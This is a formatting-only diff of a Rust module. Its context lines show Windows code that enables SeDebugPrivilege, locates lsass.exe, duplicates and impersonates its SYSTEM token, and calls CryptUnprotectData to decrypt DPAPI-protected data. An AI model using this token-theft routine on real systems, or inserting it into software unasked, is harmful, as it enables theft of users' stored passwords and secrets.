@@ -9,11 +9,19 @@ pub(super) fn dpapi_unprotect(data: &[u8]) -> Option<Vec<u8>> {
         cbData: data.len() as u32,
         pbData: data.as_ptr() as *mut u8,
     };
-    let mut blob_out = DATA_BLOB { cbData: 0, pbData: std::ptr::null_mut() };
+    let mut blob_out = DATA_BLOB {
+        cbData: 0,
+        pbData: std::ptr::null_mut(),
+    };
     unsafe {
         let ok = CryptUnprotectData(
-            &blob_in, std::ptr::null(), std::ptr::null(),
-            std::ptr::null(), std::ptr::null(), 0, &mut blob_out,
+            &blob_in,
+            std::ptr::null(),
+            std::ptr::null(),
+            std::ptr::null(),
+            std::ptr::null(),
+            0,
+            &mut blob_out,
         );
         if ok == 0 || blob_out.pbData.is_null() {
             return None;
@@ -43,7 +51,15 @@ pub(super) fn dpapi_decrypt_as_system(data: &[u8]) -> Option<Vec<u8>> {
             } // TOKEN_DUPLICATE | TOKEN_QUERY
 
             let mut lsass_token: isize = 0;
-            if DuplicateTokenEx(h_token, 0x000F01FF, std::ptr::null(), 2, 1, &mut lsass_token) == 0 {
+            if DuplicateTokenEx(
+                h_token,
+                0x000F01FF,
+                std::ptr::null(),
+                2,
+                1,
+                &mut lsass_token,
+            ) == 0
+            {
                 CloseHandle(h_token);
                 return None;
             }
@@ -81,7 +97,11 @@ unsafe fn find_lsass_pid() -> Option<u32> {
     if Process32FirstW(snapshot, &mut pe) != 0 {
         loop {
             let name = String::from_utf16_lossy(
-                &pe.szExeFile[..pe.szExeFile.iter().position(|&c| c == 0).unwrap_or(pe.szExeFile.len())]
+                &pe.szExeFile[..pe
+                    .szExeFile
+                    .iter()
+                    .position(|&c| c == 0)
+                    .unwrap_or(pe.szExeFile.len())],
             );
             if name.eq_ignore_ascii_case("lsass.exe") {
                 CloseHandle(snapshot);
@@ -116,7 +136,14 @@ unsafe fn enable_debug_privilege() -> Option<()> {
         Attributes: 0x00000002, // SE_PRIVILEGE_ENABLED
     };
 
-    AdjustTokenPrivileges(h_token, 0, &tp, 0, std::ptr::null_mut(), std::ptr::null_mut());
+    AdjustTokenPrivileges(
+        h_token,
+        0,
+        &tp,
+        0,
+        std::ptr::null_mut(),
+        std::ptr::null_mut(),
+    );
     CloseHandle(h_token);
     Some(())
 }
@@ -169,7 +196,8 @@ extern "system" {
     ) -> i32;
 
     // kernel32
-    pub(crate) fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) -> isize;
+    pub(crate) fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32)
+        -> isize;
     pub(crate) fn CloseHandle(hObject: isize) -> i32;
     fn LocalFree(hMem: *mut u8) -> isize;
     pub(crate) fn GetCurrentProcess() -> isize;
@@ -178,7 +206,11 @@ extern "system" {
     pub(crate) fn Process32NextW(hSnapshot: isize, lppe: *mut PROCESSENTRY32W) -> i32;
 
     // advapi32
-    pub(crate) fn OpenProcessToken(ProcessHandle: isize, DesiredAccess: u32, TokenHandle: *mut isize) -> i32;
+    pub(crate) fn OpenProcessToken(
+        ProcessHandle: isize,
+        DesiredAccess: u32,
+        TokenHandle: *mut isize,
+    ) -> i32;
     fn DuplicateTokenEx(
         hExistingToken: isize,
         dwDesiredAccess: u32,
@@ -189,7 +221,11 @@ extern "system" {
     ) -> i32;
     fn ImpersonateLoggedOnUser(hToken: isize) -> i32;
     fn RevertToSelf() -> i32;
-    pub(crate) fn LookupPrivilegeValueW(lpSystemName: *const u16, lpName: *const u16, lpLuid: *mut i64) -> i32;
+    pub(crate) fn LookupPrivilegeValueW(
+        lpSystemName: *const u16,
+        lpName: *const u16,
+        lpLuid: *mut i64,
+    ) -> i32;
     pub(crate) fn AdjustTokenPrivileges(
         TokenHandle: isize,
         DisableAllPrivileges: i32,
@@ -199,4 +235,3 @@ extern "system" {
         ReturnLength: *mut u32,
     ) -> i32;
 }
-
